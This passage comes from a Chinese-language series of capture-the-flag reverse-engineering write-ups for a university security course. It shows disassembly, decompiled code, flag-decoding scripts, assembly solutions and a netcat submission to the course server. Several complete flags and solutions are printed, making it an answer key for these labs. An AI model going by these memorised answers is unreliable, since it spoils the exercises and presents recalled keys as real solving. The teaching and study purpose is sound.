6D 70 2F 66 6C 61+aTmpFlag db \u0026#39;/tmp/flag\u0026#39;,0 ; DATA XREF: .text:0000000000401007↑o ; --------------------------------------------------------------------------- loc_401026: ; CODE XREF: .text:000000000040101A↑j 48 83 F8 00 cmp rax, 0 7E 09 jle short loc_401035 EB 41 jmp short loc_40106F ; --------------------------------------------------------------------------- 77 72 6F 6E 67 0A 00 aWrong db \u0026#39;wrong\u0026#39;,0Ah,0 ; DATA XREF: .text:0000000000401043↓o ; --------------------------------------------------------------------------- loc_401035: ; CODE XREF: .text:000000000040102A↑j ; .text:00000000004010E6↓j 48 C7 C0 01 00 00 00 mov rax, 1 48 C7 C7 01 00 00 00 mov rdi, 1 48 C7 C6 2E 10 40 00 mov rsi, offset aWrong ; \u0026#34;wrong\\n\u0026#34; 48 BA 07 00 00 00 00 00+ mov rdx, 7 0F 05 syscall ; LINUX - sys_write loc_401056: ; CODE XREF: .text:000000000040111E↓j 48 C7 C0 3C 00 00 00 mov rax, 3Ch 48 C7 C7 00 00 00 00 mov rdi, 0 0F 05 syscall ; LINUX - sys_exit loc_401066: ; DATA XREF: .text:000000000040110B↓o 63 6F 72 movsxd ebp, dword ptr [rdi+72h] 72 65 jb short near ptr loc_4010CA+6 63 74 0A 00 movsxd esi, dword ptr [rdx+rcx+0] loc_40106F: ; CODE XREF: .text:000000000040102C↑j 48 83 EC 40 sub rsp, 40h 48 C7 C0 00 00 00 00 mov rax, 0 4C 89 FF mov rdi, r15 48 89 E6 mov rsi, rsp 48 C7 C2 32 00 00 00 mov rdx, 32h 0F 05 syscall ; LINUX - sys_read EB 38 jmp short loc_4010C3 ; --------------------------------------------------------------------------- B3 BA BE B8 84 byte_40108B db 0B3h, 0BAh, 0BEh, 0B8h, 84h ; DATA XREF: .text:loc_4010CA↓o 99 90 8D 92 8B D1 98 9E+ dq 9E98D18B928D9099h, 0D19290D29C8D9A92h, 8F978FBDD1D0888Bh 92 9A 8D 9C D2 90 92 D1+ dq 0CCCDCB92C28C9DC0h, 0CEC2BE8D91D9C7C7h, 0FFFFFFCF82C8CFC7h FF FF FF db 3 dup(0FFh) ; --------------------------------------------------------------------------- loc_4010C3: ; CODE XREF: .text:0000000000401089↑j 48 C7 C1 07 00 00 00 mov rcx, 7 loc_4010CA: ; CODE XREF: .text:0000000000401069↑j 48 C7 C3 8B 10 40 00 mov rbx, offset byte_40108B loc_4010D1: ; CODE XREF: .text:00000000004010EC↓j 48 8D 14 CD F8 FF FF FF lea rdx, ds:0FFFFFFFFFFFFFFF8h[rcx*8] 48 8B 04 14 mov rax, [rsp+rdx] 48 F7 D8 neg rax 86 C4 xchg al, ah 48 3B 04 13 cmp rax, [rbx+rdx] 0F 85 49 FF FF FF jnz loc_401035 E2 E3 loop loc_4010D1 EB 0D jmp short loc_4010FD ; --------------------------------------------------------------------------- 68 65 6C 6C 6F 20 77 6F+aHelloWorld db \u0026#39;hello world\u0026#39;,0Ah,0 ; --------------------------------------------------------------------------- loc_4010FD: ; CODE XREF: .text:00000000004010EE↑j 48 C7 C0 01 00 00 00 mov rax, 1 48 C7 C7 01 00 00 00 mov rdi, 1 48 C7 C6 66 10 40 00 mov rsi, offset loc_401066 48 BA 09 00 00 00 00 00+ mov rdx, 9 0F 05 syscall ; LINUX - sys_write E9 33 FF FF FF jmp loc_401056 _text ends end start :::\nRecon # 這一題就只是單純的用工人智慧看組語，我的想法是先看一下system call，他先把/tmp/flag打開12，如果有找到該檔案就會通過cmp然後跳到loc_40106F，並且讀取裡面的內容，然後loc_4010C3就看不懂了，==這時候就直接用gdb跟一下流程==，就會發現其實IDA的翻譯是有問題的，因為後面有一個cmp rax, QWORD PTR [rbx+rdx*1]，所以就稍微看一下內容是甚麼，\n$rax : 0x0 $rbx : 0x000000000040108b → mov bl, 0xba $rcx : 0x7 $rdx : 0x30 這不就是byte_40108B的所在位置嗎，而實際的rbx+rdx*1存的內容如下\ngef➤ x/g $rbx+$rdx*1 0x4010bb: 0xffffffffffffcf82 我們必須修正IDA的錯誤翻譯，可以善用d快捷鍵然後把每一個data長度變成dq，正確翻譯如下\nqword_40108B dq 8D909984B8BEBAB3h ; DATA XREF: .text:loc_4010CA↓o dq 8D9A929E98D18B92h dq 0D0888BD19290D29Ch dq 8C9DC08F978FBDD1h dq 0D9C7C7CCCDCB92C2h dq 0C8CFC7CEC2BE8D91h dq 0FFFFFFFFFFFFCF82h 所以整體流程應該就蠻清楚了，這支程式就是先讀取/tmp/flag的資料然後從後面讀取8個bytes後==做了一些操作==和qword_40108B的每一個dq做比較，如果比較的結果不符合就會跳到loc_401035(print出wrong後直接exit(0))，如果每一個dq都是正確的就會到下面的loc_4010FD然後print出一些東西，所以很明顯的是那些==操作==到底做了甚麼事情，如果跟一下gdb就會發現只是\n把數值變成負數 交換ah和al暫存器 Exploit # 先把ah和al的數值交換 取補數 fake_flag = [\u0026#34;8D909984B8BEBAB3\u0026#34;, \u0026#34;8D9A929E98D18B92\u0026#34;, \u0026#34;D0888BD19290D29C\u0026#34;, \u0026#34;8C9DC08F978FBDD1\u0026#34;, \u0026#34;D9C7C7CCCDCB92C2\u0026#34;, \u0026#34;C8CFC7CEC2BE8D91\u0026#34;, \u0026#34;FFFFFFFFFFFFCF82\u0026#34;] BIG_NUM = 1\u0026lt;\u0026lt;64 FLAG = [] for i in fake_flag: tmp = i[:12] + i[14:16] + i[12:14] print(tmp) tmp = BIG_NUM - int(tmp, 16) FLAG.append(bytes.fromhex(hex(tmp)[2:]).decode(\u0026#39;utf-8\u0026#39;)[::-1]) print(\u0026#34;\u0026#34;.join(FLAG)) Reference # Linux System Call Table for x86 64\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n如果要打開的檔案存在則$rax的數值就會是一個大於零的數值，反之就會是小於零\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":403,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/","title":"Simple Reverse - 0x03(Lab - Why)","section":"Securities","content":" Simple Reverse - 0x03(Lab - Why) # Background # What is function pointer? Lecture Vid. Source Code # :::spoiler IDA main function\nint __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-4h] printf(\u0026#34;Give me flag: \u0026#34;); __isoc99_scanf(\u0026#34;%25s\u0026#34;, buf); for ( i = 0; i \u0026lt;= 24; ++i ) { if ( buf[i] - 10 != enc_flag[i] ) return 0; } pass = 1; return 0; } :::\n:::spoiler .init_array \u0026amp; .fini_array Byte Code\n.init_array:0000000000003DB0 __frame_dummy_init_array_entry dq offset frame_dummy .init_array:0000000000003DB0 ; DATA XREF: LOAD:0000000000000168↑o .init_array:0000000000003DB0 ; LOAD:00000000000002F0↑o .init_array:0000000000003DB0 ; __libc_csu_init+2↑o .init_array:0000000000003DB0 ; __libc_csu_init+41↑r .init_array:0000000000003DB0 ; Alternative name is \u0026#39;__init_array_start\u0026#39; .init_array:0000000000003DB8 dq offset _sub_1169 .init_array:0000000000003DC0 dq offset _sub_119d .init_array:0000000000003DC8 dq offset _sub_10d8 .init_array:0000000000003DC8 _init_array ends .init_array:0000000000003DC8 .fini_array:0000000000003DD0 ; ELF Termination Function Table .fini_array:0000000000003DD0 ; =========================================================================== .fini_array:0000000000003DD0 .fini_array:0000000000003DD0 ; Segment type: Pure data .fini_array:0000000000003DD0 ; Segment permissions: Read/Write .fini_array:0000000000003DD0 _fini_array segment qword public \u0026#39;DATA\u0026#39; use64 .fini_array:0000000000003DD0 assume cs:_fini_array .fini_array:0000000000003DD0 ;org 3DD0h .fini_array:0000000000003DD0 __do_global_dtors_aux_fini_array_entry dq offset __do_global_dtors_aux .fini_array:0000000000003DD0 ; DATA XREF: __libc_csu_init+19↑o .fini_array:0000000000003DD0 ; Alternative name is \u0026#39;__init_array_end\u0026#39; .fini_array:0000000000003DD8 dq offset _sub_11f8 .fini_array:0000000000003DD8 _fini_array ends :::\n:::spoiler IDA Disassembly sub_11f8\nint sub_11f8() { if ( pass ) return puts(\u0026#34;Correct :)\u0026#34;); else return puts(\u0026#34;Wrong :(\u0026#34;); } :::\nRecon # 這一題如果以解題的觀點來說的話，其實很簡單，但他想要傳達的概念很重要，也就是.init和.fini的事情\n先執行看看，發現有兩種字串可以先注意，一個是Give me flag: 和Wrong :(\n$ ./why_be9d4253a27b1d44 Give me flag: 123456 Wrong :( 再用IDA看一下整體的架構(如上) 可以發現整體的流程很簡單，他就是叫user輸入25個char，然後每次取一個位元減10再和env_flag的相對字元比較，如果都是對的，pass = 1;，但看起來這一段程式並沒有剛剛提到的Wrong :(，所以我們用Strings Windows和Xrefs跟一下誰用了這個data，並擷取出code如上(第二和第三的source code)\n繼續往上追一下 會發現sub_11f8這個function是定義在.fini_array的區段，代表是在main function結束的時候才會執行的\nExploit # \u0026gt;\u0026gt;\u0026gt; flag = [0x50, 0x56, 0x4B, 0x51, 0x85, 0x73, 0x78, 0x73, 0x7E, 0x69, 0x70, 0x73, 0x78, 0x73, 0x69, 0x77, 0x7A, 0x7C, 0x79, 0x7E, 0x6F, 0x6D, 0x7E, 0x2B, 0x87] \u0026gt;\u0026gt;\u0026gt; for i in range(len(flag)): ... flag[i] -= 10 ... \u0026gt;\u0026gt;\u0026gt; FLAG = [] \u0026gt;\u0026gt;\u0026gt; for i in range(len(flag)): ... FLAG.append(bytes.fromhex(\u0026#39;{:x}\u0026#39;.format(flag[i])).decode(\u0026#39;cp437\u0026#39;)) ... \u0026gt;\u0026gt;\u0026gt; \u0026#34;\u0026#34;.join(FLAG) \u0026#39;FLAG{init_fini_mprotect!}\u0026#39; \u0026gt;\u0026gt;\u0026gt; exit() $ ./why_be9d4253a27b1d44 Give me flag: FLAG{init_fini_mprotect!} Correct :) "},{"id":404,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/","title":"Simple Reverse - 0x14(2023 Lab - AssemblyDev)","section":"Securities","content":" Simple Reverse - 0x14(2023 Lab - AssemblyDev) # Background # Tools Assembly x86 Emulator Compiler Explorer\nSource code # :::spoiler arithmatic.py\n#!/usr/bin/python from module.checker import * from module.math import * from sys import argv challenge_info = f\u0026#39;\u0026#39;\u0026#39; let a = MEM[RSP+0x0:RSP+0x4] let b = MEM[RSP+0x4:RSP+0x8] let c = MEM[RSP+0x8:RSP+0xc] EAX = a + b EBX = a - b ECX = -c EDX = 9*a + 7 \u0026#39;\u0026#39;\u0026#39; a = get_rand(4) b = get_rand(4) c = get_rand(4) init_list = [ (RSP_DEFAULT + 0x0, a, 4), (RSP_DEFAULT + 0x4, b, 4), (RSP_DEFAULT + 0x8, c, 4), ] ans_list = [ (\u0026#34;eax\u0026#34;, add(a, b, 4)), (\u0026#34;ebx\u0026#34;, sub(a, b, 4)), (\u0026#34;ecx\u0026#34;, neg(c, 4)), (\u0026#34;edx\u0026#34;, add(mul(a, 9, 4), 7, 4)), ] if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) \u0026lt; 2: print(f\u0026#34;{C.BLUE}[+]{C.NC} Usage: python3 {__file__} \u0026lt;path_to_asm_file\u0026gt;\u0026#34;) print(challenge_info) exit(0) code = open(argv[1], \u0026#39;r\u0026#39;).read() Checker(init_list, ans_list, code) ::: :::spoiler data_movement.py\n#!/usr/bin/python from module.checker import * from module.math import * from sys import argv challenge_info = f\u0026#39;\u0026#39;\u0026#39; {C.BLUE}# Modify register value{C.NC} RAX += 0x87 RBX -= 0x63 RCX, RDX = RDX, RCX {C.BLUE}# Modify memory value{C.NC} MEM[RSP+0x0:RSP+0x4] += 0xdeadbeef MEM[RSP+0x4:RSP+0x8] -= 0xfaceb00c MEM[RSP+0x8:RSP+0xc], MEM[RSP+0xc:RSP+0x10] = MEM[RSP+0xc:RSP+0x10], MEM[RSP+0x8:RSP+0xc] \u0026#39;\u0026#39;\u0026#39; _rax = get_rand() _rbx = get_rand() _rcx = get_rand() _rdx = get_rand() mem = list() for i in range(4): mem.append(get_rand(4)) init_list = [ (\u0026#34;rax\u0026#34;, _rax), (\u0026#34;rbx\u0026#34;, _rbx), (\u0026#34;rcx\u0026#34;, _rcx), (\u0026#34;rdx\u0026#34;, _rdx), (RSP_DEFAULT + 0x0, mem[0], 4), (RSP_DEFAULT + 0x4, mem[1], 4), (RSP_DEFAULT + 0x8, mem[2], 4), (RSP_DEFAULT + 0xc, mem[3], 4), ] ans_list = [ (\u0026#34;rax\u0026#34;, add(_rax, 0x87)), (\u0026#34;rbx\u0026#34;, sub(_rbx, 0x63)), (\u0026#34;rcx\u0026#34;, _rdx), (\u0026#34;rdx\u0026#34;, _rcx), (RSP_DEFAULT + 0x0, add(mem[0], 0xdeadbeef, 4), 4), (RSP_DEFAULT + 0x4, sub(mem[1], 0xfaceb00c, 4), 4), (RSP_DEFAULT + 0x8, mem[3], 4), (RSP_DEFAULT + 0xc, mem[2], 4), ] if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) \u0026lt; 2: print(f\u0026#34;{C.BLUE}[+]{C.NC} Usage: python3 {__file__} \u0026lt;path_to_asm_file\u0026gt;\u0026#34;) print(challenge_info) exit(0) code = open(argv[1], \u0026#39;r\u0026#39;).read() Checker(init_list, ans_list, code) ::: :::spoiler condition.py\n#!/usr/bin/python from module.checker import * from module.math import * from sys import argv challenge_info = f\u0026#39;\u0026#39;\u0026#39; let a = MEM[RSP+0x0:RSP+0x4] let b = MEM[RSP+0x4:RSP+0x8] let c = MEM[RSP+0x8:RSP+0xc] let d = MEM[RSP+0xc:RSP+0x10] {C.BLUE}# a, b -\u0026gt; signed 4 btyes integer{C.NC} if a \u0026gt;= b: EAX = a else: EAX = b {C.BLUE}# c, d -\u0026gt; unsigned 4 btyes integer{C.NC} if c \u0026lt; d: EBX = c else: EBX = d if c is an odd number: ECX = c // 8 else: ECX = c * 4 \u0026#39;\u0026#39;\u0026#39; a = get_rand(4) b = get_rand(4) c = get_rand(4) d = get_rand(4) init_list = [ (RSP_DEFAULT + 0x0, a, 4), (RSP_DEFAULT + 0x4, b, 4), (RSP_DEFAULT + 0x8, c, 4), (RSP_DEFAULT + 0xc, d, 4), ] a = u2signed(a, 4) b = u2signed(b, 4) _eax = (a if a \u0026gt;= b else b) \u0026amp; mask(4) _ebx = (c if c \u0026lt; d else d) \u0026amp; mask(4) _ecx = div(c, 8, 4) if is_odd(c) else mul(c, 4, 4) ans_list = [ (\u0026#34;eax\u0026#34;, _eax), (\u0026#34;ebx\u0026#34;, _ebx), (\u0026#34;ecx\u0026#34;, _ecx), ] if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) \u0026lt; 2: print(f\u0026#34;{C.BLUE}[+]{C.NC} Usage: python3 {__file__} \u0026lt;path_to_asm_file\u0026gt;\u0026#34;) print(challenge_info) exit(0) code = open(argv[1], \u0026#39;r\u0026#39;).read() Checker(init_list, ans_list, code) :::\nRecon # 這一題有三小題，包含arithmatic.py, data_movement.py, 以及condition.py，過關的條件是要自己寫assembly然後達帶這三個關卡的register或stack條件，我是直接用compiler explorer幫我把c code直接轉assembly然後再利用assembly x86 emulator做double check，速度應該會快很多\nExploit # 題目一: 就是一般的運算(+-*/) let a = MEM[RSP+0x0:RSP+0x4] let b = MEM[RSP+0x4:RSP+0x8] let c = MEM[RSP+0x8:RSP+0xc] EAX = a + b EBX = a - b ECX = -c EDX = 9*a + 7 :::spoiler Solution mov r8d, dword [rsp] ; mov r9d, dword [rsp + 4] ; mov r10d, dword [rsp + 8] ; ; EAX = a + b mov eax, r8d add eax, r9d ; EBX = a - b mov ecx, r8d sub ecx, r9d mov ebx, ecx ; ECX = -c mov ecx, r10d neg ecx ; EDX = 9 * a + 7 mov edx, DWORD [rsp] sal edx, 3 add edx, DWORD [rsp] add edx, 7 ::: 題目二: 這邊是考register和stack之間的搬運和運算 # Modify register value RAX += 0x87 RBX -= 0x63 RCX, RDX = RDX, RCX {C.BLUE}# Modify memory value MEM[RSP+0x0:RSP+0x4] += 0xdeadbeef MEM[RSP+0x4:RSP+0x8] -= 0xfaceb00c MEM[RSP+0x8:RSP+0xc], MEM[RSP+0xc:RSP+0x10] = MEM[RSP+0xc:RSP+0x10], MEM[RSP+0x8:RSP+0xc] :::spoiler Solution ; Modify register value add rax, 0x87 sub rbx, 0x63 mov r8, rcx mov rcx, rdx mov rdx, r8 ; MEM[RSP+0x0:RSP+0x4] += 0xdeadbeef mov r8d, dword [rsp] add r8d, 0xdeadbeef mov dword [rsp], r8d ; MEM[RSP+0x4:RSP+0x8] -= 0xfaceb00c mov r8d, dword [rsp+4] sub r8d, 0xfaceb00c mov dword [rsp+4], r8d ; MEM[RSP+0x8:RSP+0xc], MEM[RSP+0xc:RSP+0x10] = MEM[RSP+0xc:RSP+0x10], MEM[RSP+0x8:RSP+0xc] mov r8d, dword [rsp+8] mov r9d, dword [rsp+0xc] mov dword [rsp+8], r9d mov dword [rsp+0xc], r8d ::: 題目三: 需要考慮condition，然後看要跳轉到哪邊，重點是jump有分signed和unsigned，而仔細看source code他只有考慮unsinged，所以我們要特別挑選jump的類別 let a = MEM[RSP+0x0:RSP+0x4] let b = MEM[RSP+0x4:RSP+0x8] let c = MEM[RSP+0x8:RSP+0xc] let d = MEM[RSP+0xc:RSP+0x10] # a, b -\u0026gt; signed 4 btyes integer if a \u0026gt;= b: EAX = a else: EAX = b # c, d -\u0026gt; unsigned 4 btyes integer{C.NC} if c \u0026lt; d: EBX = c else: EBX = d if c is an odd number: ECX = c // 8 else: ECX = c * 4 :::spoiler Solution ; if a \u0026gt;= b: ; EAX = a ; else: ; EAX = b mov eax, DWORD [rsp] cmp eax, DWORD [rsp+4] jl L2 mov eax, DWORD [rsp] jmp L3 L2: mov eax, DWORD [rsp+4] ; if c \u0026lt; d: ; EBX = c ; else: ; EBX = d L3: mov edi, DWORD [esp+0x8] mov esi, DWORD [esp+0xc] cmp edi, esi jae L4 mov ebx, DWORD [esp+0x8] jmp L5 L4: mov ebx, DWORD [esp+0xc] ; if c is an odd number: ; ECX = c // 8 ; else: ; ECX = c * 4 L5: mov edi, DWORD [esp+0x8] and edi, 1 cmp edi, 1 jne L6 mov ecx, dword [esp+0x8] sar ecx, 3 jmp L7 L6: mov ecx, dword [esp+0x8] sal ecx, 2 L7: ::: $ (cat arithmatic.asm | base64 -w0 ; echo \u0026#39;\u0026#39; ; cat data_movement.asm | base64 -w0 ; echo \u0026#39;\u0026#39; ; cat condition.asm | base64 -w0 ; echo \u0026#39;\u0026#39;) \u0026gt; answer.txt $ cat answer.txt | nc edu-ctf.zoolab.org 10020 :::spoiler 完整的輸出結果\ncat answer.txt | nc edu-ctf.zoolab.org 10020 ──── Challenge Info ────────────────────────────────────────────── let a = MEM[RSP+0x0:RSP+0x4] let b = MEM[RSP+0x4:RSP+0x8] let c = MEM[RSP+0x8:RSP+0xc] EAX = a + b EBX = a - b ECX = -c EDX = 9*a + 7 Give me your base64 of your assembly code! \u0026gt; ──── Your Assembly ─────────────────────────────────────────────── mov r8d, dword [rsp] ; mov r9d, dword [rsp + 4] ; mov r10d, dword [rsp + 8] ; ; EAX = a + b mov eax, r8d add eax, r9d ; EBX = a - b mov ecx, r8d sub ecx, r9d mov ebx, ecx ; ECX = -c mov ecx, r10d neg ecx ; EDX = 9 * a + 7 mov edx, DWORD [rsp] sal edx, 3 add edx, DWORD [rsp] add edx, 7 ([68, 139, 4, 36, 68, 139, 76, 36, 4, 68, 139, 84, 36, 8, 68, 137, 192, 68, 1, 200, 68, 137, 193, 68, 41, 201, 137, 203, 68, 137, 209, 247, 217, 139, 20, 36, 193, 226, 3, 3, 20, 36, 131, 194, 7], 44) [ Initial Context ] ──── register ──────────────────────────────────────────────────── $rax: 0x0000000000000000 $rbx: 0x0000000000000000 $rcx: 0x0000000000000000 $rdx: 0x0000000000000000 $rdi: 0x0000000000000000 $rsi: 0x0000000000000000 $rbp: 0x0000000000000000 $rsp: 0x0000000007100000 ──── stack ─────────────────────────────────────────────────────── 0x7100000|+0x0000: 0x3ad14697f68546bc ← $rsp 0x7100008|+0x0008: 0x00000000aa428281 0x7100010|+0x0010: 0x0000000000000000 0x7100018|+0x0018: 0x0000000000000000 0x7100020|+0x0020: 0x0000000000000000 0x7100028|+0x0028: 0x0000000000000000 0x7100030|+0x0030: 0x0000000000000000 0x7100038|+0x0038: 0x0000000000000000 [ Final Context ] ──── register ──────────────────────────────────────────────────── $rax: 0x0000000031568d53 $rbx: 0x00000000bbb40025 $rcx: 0x0000000055bd7d7f $rdx: 0x00000000aaaf7ca3 $rdi: 0x0000000000000000 $rsi: 0x0000000000000000 $rbp: 0x0000000000000000 $rsp: 0x0000000007100000 ──── stack ─────────────────────────────────────────────────────── 0x7100000|+0x0000: 0x3ad14697f68546bc ← $rsp 0x7100008|+0x0008: 0x00000000aa428281 0x7100010|+0x0010: 0x0000000000000000 0x7100018|+0x0018: 0x0000000000000000 0x7100020|+0x0020: 0x0000000000000000 0x7100028|+0x0028: 0x0000000000000000 0x7100030|+0x0030: 0x0000000000000000 0x7100038|+0x0038: 0x0000000000000000 ──── Result ────────────────────────────────────────────────────── [O] $eax = 0x31568d53 [O] $ebx = 0xbbb40025 [O] $ecx = 0x55bd7d7f [O] $edx = 0xaaaf7ca3 [+] CORRECT :) ──── Challenge Info ────────────────────────────────────────────── # Modify register value RAX += 0x87 RBX -= 0x63 RCX, RDX = RDX, RCX # Modify memory value MEM[RSP+0x0:RSP+0x4] += 0xdeadbeef MEM[RSP+0x4:RSP+0x8] -= 0xfaceb00c MEM[RSP+0x8:RSP+0xc], MEM[RSP+0xc:RSP+0x10] = MEM[RSP+0xc:RSP+0x10], MEM[RSP+0x8:RSP+0xc] Give me your base64 of your assembly code! \u0026gt; ──── Your Assembly ─────────────────────────────────────────────── ; Modify register value add rax, 0x87 sub rbx, 0x63 mov r8, rcx mov rcx, rdx mov rdx, r8 ; MEM[RSP+0x0:RSP+0x4] += 0xdeadbeef mov r8d, dword [rsp] add r8d, 0xdeadbeef mov dword [rsp], r8d ; MEM[RSP+0x4:RSP+0x8] -= 0xfaceb00c mov r8d, dword [rsp+4] sub r8d, 0xfaceb00c mov dword [rsp+4], r8d ; MEM[RSP+0x8:RSP+0xc], MEM[RSP+0xc:RSP+0x10] = MEM[RSP+0xc:RSP+0x10], MEM[RSP+0x8:RSP+0xc] mov r8d, dword [rsp+8] mov r9d, dword [rsp+0xc] mov dword [rsp+8], r9d mov dword [rsp+0xc], r8d ([72, 5, 135, 0, 0, 0, 72, 131, 235, 99, 73, 137, 200, 72, 137, 209, 76, 137, 194, 68, 139, 4, 36, 65, 129, 192, 239, 190, 173, 222, 68, 137, 4, 36, 68, 139, 68, 36, 4, 65, 129, 232, 12, 176, 206, 250, 68, 137, 68, 36, 4, 68, 139, 68, 36, 8, 68, 139, 76, 36, 12, 68, 137, 76, 36, 8, 68, 137, 68, 36, 12], 47) [ Initial Context ] ──── register ──────────────────────────────────────────────────── $rax: 0xd9efd9c16a5bc322 $rbx: 0xb9cf8db36cbfc14a $rcx: 0x938ee6ed0bf25e63 $rdx: 0xead92779318623a4 $rdi: 0x0000000000000000 $rsi: 0x0000000000000000 $rbp: 0x0000000000000000 $rsp: 0x0000000007100000 ──── stack ─────────────────────────────────────────────────────── 0x7100000|+0x0000: 0xfc969827aea7be89 ← $rsp 0x7100008|+0x0008: 0x6482df8494b54caf 0x7100010|+0x0010: 0x0000000000000000 0x7100018|+0x0018: 0x0000000000000000 0x7100020|+0x0020: 0x0000000000000000 0x7100028|+0x0028: 0x0000000000000000 0x7100030|+0x0030: 0x0000000000000000 0x7100038|+0x0038: 0x0000000000000000 [ Final Context ] ──── register ──────────────────────────────────────────────────── $rax: 0xd9efd9c16a5bc3a9 $rbx: 0xb9cf8db36cbfc0e7 $rcx: 0xead92779318623a4 $rdx: 0x938ee6ed0bf25e63 $rdi: 0x0000000000000000 $rsi: 0x0000000000000000 $rbp: 0x0000000000000000 $rsp: 0x0000000007100000 ──── stack ─────────────────────────────────────────────────────── 0x7100000|+0x0000: 0x01c7e81b8d557d78 ← $rsp 0x7100008|+0x0008: 0x94b54caf6482df84 0x7100010|+0x0010: 0x0000000000000000 0x7100018|+0x0018: 0x0000000000000000 0x7100020|+0x0020: 0x0000000000000000 0x7100028|+0x0028: 0x0000000000000000 0x7100030|+0x0030: 0x0000000000000000 0x7100038|+0x0038: 0x0000000000000000 ──── Result ────────────────────────────────────────────────────── [O] $rax = 0xd9efd9c16a5bc3a9 [O] $rbx = 0xb9cf8db36cbfc0e7 [O] $rcx = 0xead92779318623a4 [O] $rdx = 0x938ee6ed0bf25e63 [O] [0x077100000] = 0x8d557d78 [O] [0x077100004] = 0x1c7e81b [O] [0x077100008] = 0x6482df84 [O] [0x07710000c] = 0x94b54caf [+] CORRECT :) ──── Challenge Info ────────────────────────────────────────────── let a = MEM[RSP+0x0:RSP+0x4] let b = MEM[RSP+0x4:RSP+0x8] let c = MEM[RSP+0x8:RSP+0xc] let d = MEM[RSP+0xc:RSP+0x10] # a, b -\u0026gt; signed 4 btyes integer if a \u0026gt;= b: EAX = a else: EAX = b # c, d -\u0026gt; unsigned 4 btyes integer if c \u0026lt; d: EBX = c else: EBX = d if c is an odd number: ECX = c // 8 else: ECX = c * 4 Give me your base64 of your assembly code! \u0026gt; ──── Your Assembly ─────────────────────────────────────────────── ; if a \u0026gt;= b: ; EAX = a ; else: ; EAX = b mov eax, DWORD [rsp] cmp eax, DWORD [rsp+4] jl L2 mov eax, DWORD [rsp] jmp L3 L2: mov eax, DWORD [rsp+4] ; if c \u0026lt; d: ; EBX = c ; else: ; EBX = d L3: mov edi, DWORD [esp+0x8] mov esi, DWORD [esp+0xc] cmp edi, esi jae L4 mov ebx, DWORD [esp+0x8] jmp L5 L4: mov ebx, DWORD [esp+0xc] ; if c is an odd number: ; ECX = c // 8 ; else: ; ECX = c * 4 L5: mov edi, DWORD [esp+0x8] and edi, 1 cmp edi, 1 jne L6 mov ecx, dword [esp+0x8] sar ecx, 3 jmp L7 L6: mov ecx, dword [esp+0x8] sal ecx, 2 L7: ([139, 4, 36, 59, 68, 36, 4, 124, 5, 139, 4, 36, 235, 4, 139, 68, 36, 4, 103, 139, 124, 36, 8, 103, 139, 116, 36, 12, 57, 247, 115, 7, 103, 139, 92, 36, 8, 235, 5, 103, 139, 92, 36, 12, 103, 139, 124, 36, 8, 131, 231, 1, 131, 255, 1, 117, 10, 103, 139, 76, 36, 8, 193, 249, 3, 235, 8, 103, 139, 76, 36, 8, 193, 225, 2], 89) [ Initial Context ] ──── register ──────────────────────────────────────────────────── $rax: 0x0000000000000000 $rbx: 0x0000000000000000 $rcx: 0x0000000000000000 $rdx: 0x0000000000000000 $rdi: 0x0000000000000000 $rsi: 0x0000000000000000 $rbp: 0x0000000000000000 $rsp: 0x0000000007100000 ──── stack ─────────────────────────────────────────────────────── 0x7100000|+0x0000: 0x21bd1f6bf4090a3a ← $rsp 0x7100008|+0x0008: 0xfd382fd2ccd74eca 0x7100010|+0x0010: 0x0000000000000000 0x7100018|+0x0018: 0x0000000000000000 0x7100020|+0x0020: 0x0000000000000000 0x7100028|+0x0028: 0x0000000000000000 0x7100030|+0x0030: 0x0000000000000000 0x7100038|+0x0038: 0x0000000000000000 [ Final Context ] ──── register ──────────────────────────────────────────────────── $rax: 0x0000000021bd1f6b $rbx: 0x00000000ccd74eca $rcx: 0x00000000335d3b28 $rdx: 0x0000000000000000 $rdi: 0x0000000000000000 $rsi: 0x00000000fd382fd2 $rbp: 0x0000000000000000 $rsp: 0x0000000007100000 ──── stack ─────────────────────────────────────────────────────── 0x7100000|+0x0000: 0x21bd1f6bf4090a3a ← $rsp 0x7100008|+0x0008: 0xfd382fd2ccd74eca 0x7100010|+0x0010: 0x0000000000000000 0x7100018|+0x0018: 0x0000000000000000 0x7100020|+0x0020: 0x0000000000000000 0x7100028|+0x0028: 0x0000000000000000 0x7100030|+0x0030: 0x0000000000000000 0x7100038|+0x0038: 0x0000000000000000 ──── Result ────────────────────────────────────────────────────── [O] $eax = 0x21bd1f6b [O] $ebx = 0xccd74eca [O] $ecx = 0x335d3b28 [+] CORRECT :) ──── Your Flag ─────────────────────────────────────────────────── Congrats! You passed all challenges! Here is your flag: FLAG{c0d1Ng_1n_a5s3mB1y_i5_sO_fun!} :::\nFlag: FLAG{c0d1Ng_1n_a5s3mB1y_i5_sO_fun!}\n"},{"id":405,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/","title":"Simple Reverse - 0x15(2023 HW - crackme_vectorization)","section":"Securities","content":" Simple Reverse - 0x15(2023 HW - crackme_vectorization) # Source Code # :::spoiler IDA Main Function\n__int64 __fastcall main(int a1, char **a2, char **a3) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;user_input_len); // 長度為49 user_input_len_cp = user_input_len; sqrt_length = sqrt((double)user_input_len); // 開根號後是7 sqrt_length_cp = (int)sqrt_length; if ( sqrt_length \u0026gt; (double)(int)sqrt_length ) ++sqrt_length_cp; sqrt_len = _mm_shuffle_epi32(_mm_cvtsi32_si128(sqrt_length_cp), 224).m128i_u64[0];// 原本的shuffle num就是user input length的開根號結果 space = (struc_1 *)malloc(0x10uLL); space-\u0026gt;sqrt_len = sqrt_len; size = 4 * sqrt_length_cp * (__int64)sqrt_length_cp;// size是196 shuffle_space = malloc(size); space-\u0026gt;content_space = (__int64)shuffle_space; if ( user_input_len_cp \u0026gt; 0 ) { shuffle_space_cp = shuffle_space; len = 0LL; do { __isoc99_scanf(\u0026#34;%d\u0026#34;, content); shuffle_space_cp[len++] = content[0]; } while ( user_input_len \u0026gt; 